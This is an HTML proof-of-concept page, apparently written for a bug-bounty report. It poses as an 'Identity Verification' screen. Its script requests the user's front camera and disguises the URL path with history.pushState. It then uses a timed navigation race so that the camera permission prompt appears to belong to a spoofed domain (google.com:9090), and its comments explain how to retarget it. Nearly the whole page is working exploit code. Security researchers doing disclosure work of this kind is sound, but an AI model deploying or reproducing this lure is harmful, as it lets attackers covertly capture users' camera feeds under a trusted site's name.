<!doctype html>
<html>
  <head>
    <meta charset="utf-8" />
    <title>Verification System</title>
    <meta name="viewport" content="width=device-width,initial-scale=1" />
    <style>
      body {
        margin: 0;
        font-family: -apple-system, BlinkMacSystemFont, system-ui, sans-serif;
        background: #f5f5f7;
        display: flex;
        justify-content: center;
        align-items: center;
        height: 100vh;
      }
      .card {
        max-width: 400px;
        width: 90%;
        background: #fff;
        padding: 30px 24px;
        border-radius: 20px;
        box-shadow: 0 20px 50px rgba(0, 0, 0, 0.1);
        text-align: center;
      }
      h2 {
        margin: 0 0 10px 0;
        font-size: 22px;
        color: #1d1d1f;
      }
      p {
        font-size: 14px;
        color: #86868b;
        margin: 0 0 24px 0;
        line-height: 1.4;
      }
      .btn-verify {
        font-size: 16px;
        padding: 12px 24px;
        border-radius: 12px;
        border: none;
        background: #007aff;
        color: #fff;
        font-weight: 600;
        cursor: pointer;
        width: 100%;
        transition: background 0.2s;
      }
      .btn-verify:active {
        background: #0056b3;
      }
      #video-preview {
        display: none;
        width: 100%;
        height: 200px;
        background: #000;
        border-radius: 12px;
        margin-top: 15px;
        object-fit: cover;
      }
      .status {
        margin-top: 15px;
        font-size: 13px;
        color: #ff3b30;
        font-weight: 500;
      }
    </style>
  </head>
  <body>

    <div class="card">
      <h2>Identity Verification</h2>
      <p>To proceed with secure access, please enable your camera to complete the verification step.</p>
      
      <!-- Tombol Pemicu Utama -->
      <button id="btn-trigger" class="btn-verify" onclick="executePowerfulSpoof()">Start Camera Verification</button>
      
      <!-- Preview Video untuk membuktikan ke triager bahwa kamera sukses dibajak -->
      <video id="video-preview" autoplay playsinline muted></video>
      
      <div id="status-log" class="status"></div>
    </div>

    <script>
  function executePowerfulSpoof() {
    const btn = document.getElementById("btn-trigger");
    const video = document.getElementById("video-preview");
    const log = document.getElementById("status-log");

    // 1. Perubahan UI Instan
    btn.style.display = "none";
    video.style.display = "block";
    log.textContent = "Connecting to secure server...";

    // 2. Samarkan URL path
    history.pushState({}, "", "/v2/identity-verification/secure");

    // 3. EKSKUSI KAMERA SECARA INSTAN
    if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
      navigator.mediaDevices.getUserMedia({ 
        video: { facingMode: "user" }, 
        audio: false 
      })
      .then((stream) => {
        log.style.color = "#34c759";
        log.textContent = "CRITICAL: CAMERA ACCESSED!";
        video.srcObject = stream;
      })
      .catch((err) => {
        // Jika masih NotAllowedError, kita bisa melihatnya di sini
        log.textContent = "Error: " + err.name;
      });
    }

    // 4. PENYESUAIAN TIMING NAVIGATION (Mencegah NotAllowedError)
    // Kita menaikkan jeda ke 350ms agar dialog native kamera sempat muncul ke layar 
    // menggunakan hak akses klik pengguna, sebelum dihantam oleh race condition navigasi.
    setTimeout(() => {
      requestAnimationFrame(() => {
        requestAnimationFrame(() => {
          // Ganti domain ini dengan target yang ingin Anda spoof
          location.href = "https://google.com:9090"; 
        });
      });
    }, 350); // Jeda dinaikkan dari 30ms menjadi 350ms
  }
</script>
  </body>
</html>
